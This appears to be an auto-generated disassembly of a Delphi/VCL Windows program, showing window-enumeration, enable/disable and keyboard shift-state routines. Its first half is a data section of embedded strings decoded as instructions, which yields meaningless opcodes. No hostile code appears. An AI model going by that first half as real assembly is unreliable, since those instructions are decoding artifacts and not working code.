add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
add bh bh
add bh al
inc ebx
add [ esi + ebx * 2 + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
mov ch 0x41
add [ eax ] ch
add bh bh
adc al 0xd0
inc ebx
add [ eax + edx * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
[ eax + 0x456d ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
rol [ ecx ] 0x40
add al [ eax ]
dec [ ebp + ebp * 2 + 0x6da00045 ]
inc ebp
add [ eax ] al
add [ ecx ] cl
inc esi
outsd
jb r-xdata
and al [ ebp ]
das
add al [ eax ]
dec eax
insd
inc ebp
add [ eax + 0x456d ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
outsb
shl [ ebx ] 0x45
outsb
arpl [ eax + 0x38 ] bp
retn 0x44
add [ eax ] al
dec edi
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
[ eax + 0x456d ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
outsb
je r-xdata
add [ eax + 0x456d ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
add al [ eax ]
inc esp
outsb
inc ebp
mov edi 0x2480044
add bh bh
adc [ edi + 0x45 ] ch
add [ eax + 0x456d ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
add [ eax + 0x456d ] ah
inc eax
add [ eax + eax ] cl
inc [ eax ]
mov [ ebx ] sub_455e54
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x40109474
insb
cmp al 0x10
inc eax
add [ eax + 0x71 ] cl
inc ebp
add [ ecx + esi * 2 + 0x45 ] dl
add [ eax + 0x456d ] bl
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
in al 0x70
inc ebp
add al bh
jo r-xdata
adc [ eax ] al
xor al 0x2
add bh bh
les ebp [ esi + 0x45 ]
mov edx 0x2600044
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
and al [ ebp ]
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x30 ]
inc ebx
add [ eax ] bh
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
xor [ edx ] al
add bh bh
sub al 0x71
inc ebp
add [ eax + 0x456d ] bl
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
dec [ ecx + 0x45 ]
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ 0x74646957 ] al
jb r-xdata
add al [ eax ]
dec [ eax - 0x6700fffe ]
add [ eax + 0x456d ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
jb r-xdata
sbb eax 0x20c0045
add bh bh
movsb [ edi ] [ esi ]
dec ebp
inc ebp
add [ eax + 0x456d ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
jo r-xdata
add [ eax ] al
inc eax
add [ eax ] al
[ eax + 0x456d ]
add [ eax ] al
add [ eax ] 0x0
je r-xdata
add [ eax + 0x2 ] bl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
xchg esp eax
and al 0x45
add [ eax - 0x6700fffe ] bl
add al [ eax ]
[ eax + 0x456d ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
sub eax [ edx ]
add bh bh
inc esp
jb r-xdata
add [ eax ] al
add [ eax + eax ] 0x5
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc ebx
add al al
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
push r-xdata
add al 0x0
add eax 0x74646957
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
adc eax 0x2880041
add bh bh
mov [ edx ] al
add bh bh
cwde
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add al [ eax ]
[ eax + 0x456d ]
push ecx
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
cwde
insd
inc ebp
add [ eax ] al
jb r-xdata
push ecx
lodsb [ esi ]
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
cwde
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add al [ eax ]
call [ eax - 0x6700fffe ]
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
outsb
outsb
inc ebx
dec edi
add bh bh
call 0xffffffff9845767c
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
test [ edx + 0x2580044 ] bh
xor [ eax + 0xe80043 ] al
add bh bh
call 0xffffffff9944331d
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
[ eax + 0x456d ]
push eax
outsd
jo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
lodsb [ gs : esi ]
loopne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jbe r-xdata
jns r-xdata
outsb
inc esp
jb r-xdata
dec edi
xor al 0x81
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0xffffffff98ff0002 ]
insd
inc ebp
add [ eax ] al
jo r-xdata
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
cwde
insd
inc ebp
add [ eax ] al
lodsb [ esi ]
add [ eax + 0x4f0b003d ] al
inc ebx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
add bh bh
cwde
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xac6f666e
adc eax 0x2b00041
add bh bh
mov al 0x2
add bh bh
cwde
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
lodsb [ esi ]
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc ebx
jb r-xdata
add [ eax ] cl
dec edi
adc eax 0x2a00041
add bh bh
jb r-xdata
jo r-xdata
outsb
inc ebx
outsd
outsb
jae r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
adc eax 0x2d00041
add bh bh
rol [ edx ] 0x1
add bh bh
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
cwde
jb r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc edi
add [ edx ] cl
dec edi
jg r-xdata
cwde
insd
inc ebp
add [ eax ] al
add [ ebx ] 0xe8
add [ eax ] al
outsd
inc ebp
outsb
inc esp
add [ ebx ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ebx ] 0xff0001b8
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
[ eax + 0x456d ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
loopne r-xdata
jo r-xdata
jle r-xdata
insb
jg r-xdata
outsd
arpl [ ebx - 0x1c ] bp
add [ ebx ] 0xd0
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
[ eax + 0x456d ]
outsb
dec eax
imul esp [ ebp + 0x14 ] 0xa8004525
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
add bh bh
cwde
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
jne r-xdata
jle r-xdata
jae r-xdata
add al bl
add al ah
add [ eax ] eax
jmp eax
dec ebp
add [ esi ] al
dec edi
outsd
push ebp
push 0x446c6565
outsd
ja r-xdata
dec ebp
jae r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
[ eax + 0x456d ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
jo r-xdata
push ebp
adc eax 0x2c80041
add bh bh
enter 0x2 0xff
cwde
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x8298776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
jne r-xdata
test [ ebx ] al
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebp
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
fsub [ eax * 2 + 0x2c000 ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
outsb
dec ebp
clc
test [ ebx ] al
dec eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
adc [ edi + 0x6e ] cl
inc esp
jle r-xdata
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f100056 ] al
outsd
jbe r-xdata
dec ebp
outsb
insb
clc
inc esp
outsd
ja r-xdata
inc ebp
add [ esp + esi + 0x7ab40040 ] dh
inc ebp
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x20004556 ] dh
jb r-xdata
test [ ebx ] al
inc eax
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
adc eax 0x2b80041
add bh bh
mov eax 0x98ff0002
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ edi ] al
dec edi
push edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x4537 ]
lodsb [ esi ]
jae r-xdata
push edi
push 0xf86c6565
push edi
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
mov esp 0xd800437e
inc edx
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x45 ] dl
inc esp
add [ eax ] ah
pop esp
inc ebp
add [ eax ] al
inc ebp
inc ecx
add [ ecx ] dl
inc ebp
add [ eax + ebx * 2 + 0x59b80045 ] ch
inc ebp
add [ eax ] cl
int 0x43
add [ ecx + 0x62300041 ] dh
inc ebp
add [ esi + ebx * 4 - 0x622fffbf ] dl
inc ebp
add [ eax + 0x3400459f ] ch
cmp eax 0x42500044
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax + 0x10004437 ] dh
pop edi
inc ebp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ eax ] al
inc ebp
add al bl
int1
inc ebx
add al dh
int3
inc ebp
add [ ecx + 0x54940041 ] bl
inc ebp
add [ eax + 0x56 ] cl
je r-xdata
jpe r-xdata
add [ edi + esi + 0x2f80045 ] cl
add [ eax ] al
jo r-xdata
push esp
aaa
inc ebp
outsd
arpl [ ebx + 0x2c ] bp
add [ ebx ] 0xf0
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax + 0x36 ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4537 ] ah
popad
sub_453a14
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_453a60
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d160
mov eax [ rw-data ]
call sub_419ccc
mov eax [ rw-data ]
call sub_419c74
retn
push 0x0
push eax
call ShowOwnedPopups
sub_453a98
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_453ae8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_453b8b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4036f8#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_453a98
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b92
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_453b9c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_453bd4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_453c38
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_453bd4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_453c94
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_453cb4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_453c94
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_453ce0
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45a740
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45abb0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407cc8
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45a72c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45ab9c
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407cc8
test eax eax
je r-xdata
sub_453d60
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_453db4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_453df0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_453e3c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_453e9a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4519f8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404190
mov eax [ ebp - 0x8 ]
pop edx
call sub_407cc8
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453ea1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_453eac
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_453ed4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_453f45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_453eac
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453f4c
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
sub_453f54
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_453fe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414500
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4548ac
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_45488c
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45473c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454034
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4541ec
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43d594
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45473c
xor edx edx
mov eax ebx
call sub_45473c
jmp r-xdata
sub_45406c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4242a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4540d8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4242a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_454140
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_454874
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_440438
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
